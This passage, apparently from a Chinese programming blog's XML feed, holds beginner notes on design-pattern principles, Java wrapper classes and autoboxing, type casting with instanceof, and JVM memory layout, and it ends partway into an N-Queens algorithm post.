href="#设计模式的六大原则" class="headerlink" title="设计模式的六大原则"></a>设计模式的六大原则</h2><p><strong>1、开闭原则（Open Close Principle）</strong></p><p>开闭原则的意思是：对扩展开放，对修改关闭。在程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果。简言之，是为了使程序的扩展性好，易于维护和升级。想要达到这样的效果，我们需要使用接口和抽象类，后面的具体设计中我们会提到这点。</p><p><strong>2、里氏代换原则（Liskov Substitution Principle）</strong></p><p>里氏代换原则是面向对象设计的基本原则之一。 里氏代换原则中说，任何基类可以出现的地方，子类一定可以出现。LSP 是继承复用的基石，只有当派生类可以替换掉基类，且软件单位的功能不受到影响时，基类才能真正被复用，而派生类也能够在基类的基础上增加新的行为。里氏代换原则是对开闭原则的补充。实现开闭原则的关键步骤就是抽象化，而基类与子类的继承关系就是抽象化的具体实现，所以里氏代换原则是对实现抽象化的具体步骤的规范。</p><p><strong>3、依赖倒转原则（Dependence Inversion Principle）</strong></p><p>这个原则是开闭原则的基础，具体内容：针对接口编程，依赖于抽象而不依赖于具体。</p><p><strong>4、接口隔离原则（Interface Segregation Principle）</strong></p><p>这个原则的意思是：使用多个隔离的接口，比使用单个接口要好。它还有另外一个意思是：降低类之间的耦合度。由此可见，其实设计模式就是从大型软件架构出发、便于升级和维护的软件设计思想，它强调降低依赖，降低耦合。</p><p><strong>5、迪米特法则，又称最少知道原则（Demeter Principle）</strong></p><p>最少知道原则是指：一个实体应当尽量少地与其他实体之间发生相互作用，使得系统功能模块相对独立。</p><p><strong>6、合成复用原则（Composite Reuse Principle）</strong></p><p>合成复用原则是指：尽量使用合成/聚合的方式，而不是使用继承。</p><h2 id="什么是-GOF（四人帮，全拼-Gang-of-Four）？"><a href="#什么是-GOF（四人帮，全拼-Gang-of-Four）？" class="headerlink" title="什么是 GOF（四人帮，全拼 Gang of Four）？"></a>什么是 GOF（四人帮，全拼 Gang of Four）？</h2><p>在 1994 年，由 Erich Gamma、Richard Helm、Ralph Johnson 和 John Vlissides 四人合著出版了一本名为 Design Patterns - Elements of Reusable Object-Oriented Software（中文译名：设计模式 - 可复用的面向对象软件元素） 的书，该书首次提到了软件开发中设计模式的概念。</p><p>四位作者合称 GOF（四人帮，全拼 Gang of Four）。他们所提出的设计模式主要是基于以下的面向对象设计原则。</p><blockquote><p>对接口编程而不是对实现编程。<br>优先使用对象组合而不是继承。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>JAVA设计模式</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(八)-包装类、装箱拆箱</title>
    <link href="/2021/04/18/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E5%85%AB)-%E5%8C%85%E8%A3%85%E7%B1%BB%E3%80%81%E8%A3%85%E7%AE%B1%E6%8B%86%E7%AE%B1/"/>
    <url>/2021/04/18/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E5%85%AB)-%E5%8C%85%E8%A3%85%E7%B1%BB%E3%80%81%E8%A3%85%E7%AE%B1%E6%8B%86%E7%AE%B1/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习(八)。包装类、装箱拆箱。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>也可见 《JAVA基础知识复习(一)-正文》博客内容。</p><h2 id="包装类（Wrapper）"><a href="#包装类（Wrapper）" class="headerlink" title="包装类（Wrapper）"></a>包装类（Wrapper）</h2><p>针对八种基本数据类型定义相应的引用类型 — 包装类（封装类）。</p><table><tr><th>基本数据类型</th><th>包装类</th></tr><tr><td>byte</td><td>Byte</td><td rowspan='6'>父类 ：Number</td></tr><tr><td>short</td><td>Short</td></tr><tr><td>int</td><td>Integer</td></tr><tr><td>long</td><td>Long</td></tr><tr><td>float</td><td>Float</td></tr><tr><td>double</td><td>Double</td></tr><tr><td>boolean</td><td>Boolean</td></tr><tr><td>char</td><td>Character</td></tr></table><h2 id="基本数据类型转换为包装类"><a href="#基本数据类型转换为包装类" class="headerlink" title="基本数据类型转换为包装类"></a>基本数据类型转换为包装类</h2><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>       <span class="hljs-keyword">int</span> i=<span class="hljs-number">120</span>;<br>       Integer ie = <span class="hljs-keyword">new</span> Integer(i);<br>       System.out.println(ie.toString());<br>       Integer it = <span class="hljs-keyword">new</span> Integer(<span class="hljs-string">&quot;12345&quot;</span>); <span class="hljs-comment">//必须为数字的字符串</span><br>      <span class="hljs-comment">// s = &quot;456789&quot;; </span><br>      <span class="hljs-comment">//Integer it = new Integer(s);</span><br>      <span class="hljs-comment">//输出 456789</span><br>       System.out.println(it.toString());<br><span class="hljs-comment">//       Integer it2 =new Integer(&quot;123abc&quot;); //不能加字母，否则运行时会出错</span><br><span class="hljs-comment">//       System.out.println(it2.toString());</span><br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">120</span><br><span class="hljs-number">12345</span><br></code></pre></div></td></tr></table></figure><p>其他的类型用法同样的原理。</p><h2 id="包装类转换为基本数据类型"><a href="#包装类转换为基本数据类型" class="headerlink" title="包装类转换为基本数据类型"></a>包装类转换为基本数据类型</h2><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Integer it = <span class="hljs-keyword">new</span> Integer(<span class="hljs-number">13</span>);<br>        <span class="hljs-keyword">int</span> i = it.intValue();<br>        System.out.println(i+<span class="hljs-number">1</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">14</span><br></code></pre></div></td></tr></table></figure><h2 id="基本数据类型、包装类转换成-String"><a href="#基本数据类型、包装类转换成-String" class="headerlink" title="基本数据类型、包装类转换成 String"></a>基本数据类型、包装类转换成 String</h2><p>由于基本数据类型与包装类之间可以自动转换，所以这里就把包装类和基本数据类型当成一种来和 String 之间进行转换。</p><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> num = <span class="hljs-number">10</span>;<br>String str = num + <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">float</span> fl = <span class="hljs-number">12.3f</span>;<br><span class="hljs-keyword">double</span> db = <span class="hljs-number">23.5</span>;<br>String str = String.valueOf(fl);<br>String str1 = String.valueOf(db);<br>System.out.println(str);<br>System.out.println(str1);<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">12.3</span><br><span class="hljs-number">23.5</span><br></code></pre></div></td></tr></table></figure><h2 id="String-转换成基本数据类型、包装类"><a href="#String-转换成基本数据类型、包装类" class="headerlink" title="String 转换成基本数据类型、包装类"></a>String 转换成基本数据类型、包装类</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String str = <span class="hljs-string">&quot;234&quot;</span>; <span class="hljs-comment">//不能写非数字字符</span><br>        <span class="hljs-keyword">int</span> num = Integer.parseInt(str);<br>        System.out.println(num+<span class="hljs-number">1</span>);<br><br>        String str2 = <span class="hljs-string">&quot;true&quot;</span>; <span class="hljs-comment">//只有写true输出才为true，其他的都为false，写1也为false</span><br>        <span class="hljs-keyword">boolean</span> fl = Boolean.parseBoolean(str2);<br>        System.out.println(fl);<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">235</span><br><span class="hljs-keyword">true</span><br></code></pre></div></td></tr></table></figure><h2 id="转换图"><a href="#转换图" class="headerlink" title="转换图"></a>转换图</h2><p><img src="https://img-blog.csdnimg.cn/20210418123538329.png"></p><h2 id="自动装箱"><a href="#自动装箱" class="headerlink" title="自动装箱"></a>自动装箱</h2><p>JDK 5.0 新特性。<br>基本数据类型转换成包装类。</p><p>可以理解成，小的转换成大的叫装箱。（这里的小、大表示的是谁包含谁）<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> num = <span class="hljs-number">10</span>;<br>        Integer it = num;<br>        System.out.println(it);<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure><h2 id="自动拆箱"><a href="#自动拆箱" class="headerlink" title="自动拆箱"></a>自动拆箱</h2><p>包装类转换成基本数据类型。</p><p>可以理解成，大的转换成小的叫拆箱。（这里的小、大表示的是谁包含谁）</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Integer it = <span class="hljs-number">12</span>;<br>        <span class="hljs-keyword">int</span> itt = it;<br>        System.out.println(itt);<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">12</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(七)-向上、下转型</title>
    <link href="/2021/04/18/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%B8%83)-%E5%90%91%E4%B8%8A%E3%80%81%E4%B8%8B%E8%BD%AC%E5%9E%8B/"/>
    <url>/2021/04/18/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%B8%83)-%E5%90%91%E4%B8%8A%E3%80%81%E4%B8%8B%E8%BD%AC%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习(七)。向上、下转型，instanceof 用法。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="向上转型"><a href="#向上转型" class="headerlink" title="向上转型"></a>向上转型</h2><p>多态的体现。<br>现有，Person 类、Man 类。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//Person 类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span>&#123;<br>    <span class="hljs-keyword">int</span> age;<br>    String name;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outAge</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;输出年龄&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outName</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;输出姓名&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//Man 类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Man</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Person</span></span>&#123;<br>    <span class="hljs-keyword">int</span> age;<br>    String name;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outAge</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;男人的年龄&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outName</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;男人的姓名&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">out</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;男人&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//测试</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Person p = <span class="hljs-keyword">new</span> Man();<span class="hljs-comment">//向上转型。编译看左，运行看右</span><br>        p.outAge(); <span class="hljs-comment">//同方法名，输出的是子类中的方法</span><br>        p.outName(); <span class="hljs-comment">//输出的是子类中的方法</span><br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br>男人的年龄<br>男人的姓名<br></code></pre></div></td></tr></table></figure><h2 id="向下转型"><a href="#向下转型" class="headerlink" title="向下转型"></a>向下转型</h2><p>需要输出父类中没有，但子类中有的方法时，需要将其向下转型。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//Person 类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span>&#123;<br>    <span class="hljs-keyword">int</span> age;<br>    String name;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outAge</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;输出年龄&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outName</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;输出姓名&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//Man 类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Man</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Person</span></span>&#123;<br>    <span class="hljs-keyword">int</span> age;<br>    String name;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outAge</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;男人的年龄&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outName</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;男人的姓名&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">out</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;男人&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//测试</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Person p = <span class="hljs-keyword">new</span> Man();<span class="hljs-comment">//向上转型。编译看左，运行看右</span><br>        p.outAge(); <span class="hljs-comment">//同方法名，输出的是子类中的方法</span><br>        p.outName(); <span class="hljs-comment">//输出的是子类中的方法</span><br>        Man m = <span class="hljs-keyword">new</span> Man();<br>        m = (Man) p; <span class="hljs-comment">//向下转型</span><br>        m.out();<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br>男人的年龄<br>男人的姓名<br>男人<br></code></pre></div></td></tr></table></figure><p>当在转型时，可能是会转型失败的。所以，需要来判断一下关系。用 instanceof 。</p><p>将上例中的测试代码改正一下：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Person p = <span class="hljs-keyword">new</span> Man();<br>        p.outAge();<br>        p.outName();<br>        <span class="hljs-keyword">if</span>(p <span class="hljs-keyword">instanceof</span> Person)&#123; <span class="hljs-comment">//判断 p 是否是 Person，如果是则进行转型，否则不进行。</span><br>        Man m = <span class="hljs-keyword">new</span> Man();<br>        m = (Man) p;<br>        m.out();<br>        &#125;<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br>男人的年龄<br>男人的姓名<br>男人<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(六)-内存结构简单说明</title>
    <link href="/2021/04/17/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E5%85%AD)-%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84%E7%AE%80%E5%8D%95%E8%AF%B4%E6%98%8E/"/>
    <url>/2021/04/17/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E5%85%AD)-%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84%E7%AE%80%E5%8D%95%E8%AF%B4%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习(六)。简单说明记录在内存中数据的存储位置。</p><h2 id="栈、堆、方法区"><a href="#栈、堆、方法区" class="headerlink" title="栈、堆、方法区"></a>栈、堆、方法区</h2><blockquote><p>栈（stack）：存放局部变量，即方法中的变量。包括main函数中的变量。</p></blockquote><blockquote><p>堆（heap）：存放通过 New 出来的结构，如：对象、数组。</p></blockquote><blockquote><p>方法区：又叫静态区，跟堆一样，被所有的线程共享。类的加载信息、静态域、常量池。方法区包含所有的class和static变量。<br>方法区中包含的都是在整个程序中永远唯一的元素，如class,static变量。</p></blockquote><p>如图所示：<br><img src="https://img-blog.csdnimg.cn/20210417132424525.png"></p><h2 id="一维数组的内存解析"><a href="#一维数组的内存解析" class="headerlink" title="一维数组的内存解析"></a>一维数组的内存解析</h2><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>String[] arr1 = <span class="hljs-keyword">new</span> String[<span class="hljs-number">4</span>];<br>arr1[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;刘德华&quot;</span>;<br>arr1[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;张学友&quot;</span>;<br>arr1 = <span class="hljs-keyword">new</span> String[<span class="hljs-number">3</span>];<br></code></pre></div></td></tr></table></figure><p>首先，我们先看第一句话。<br>int[] arr 是在栈中的，new int[]{1,2,3} 是在堆中的。并且初始化他们为默认值。它们之间是通过地址来连接的。</p><p>String[] att 同样也是在栈中，new String[4]是在堆中。并且初始化他们为默认值。他们之间也是通过地址连接的。att[1] = “刘德华”;att[2] = “张学友”;就是赋值。</p><p>arr1 = new String[3] 是又重新在堆中开辟了一个新空间。</p><p>具体表示如图所示，被红线划掉的表示的是开始时的默认值：</p><p><img src="https://img-blog.csdnimg.cn/20210417134816346.png"></p><h2 id="二维数组的内存解析"><a href="#二维数组的内存解析" class="headerlink" title="二维数组的内存解析"></a>二维数组的内存解析</h2><p>同一维数组一样的道理，如图,其中被红线划掉的表示的是开始的默认值：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[][] arr1 = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">4</span>][];<br>arr1[<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>arr1[<span class="hljs-number">2</span>] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">4</span>];<br>arr1[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">30</span>;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210417135549401.png"></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM经典问题-N皇后问题</title>
    <link href="/2021/04/16/ACM/ACM%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98-N%E7%9A%87%E5%90%8E%E9%97%AE%E9%A2%98/"/>
    <url>/2021/04/16/ACM/ACM%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98-N%E7%9A%87%E5%90%8E%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>在N*N的方格棋盘放置了N个皇后，使得它们不相互攻击（即任意2个皇后不允许处在同一排，同一列，也不允许处在与棋盘边框成45角的斜线上。<br>你的任务是，对于给定的N，求出有多少种合法的放置方法。</p><h3 id="问题思路解析"><a href="#问题思路解析" class="headerlink" title="问题思路解析"></a>问题思路解析</h3><p><a href="https://www.bilibili.com/video/BV1bK4y1n7iq?share_source=copy_web">N皇后视频讲解</a></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 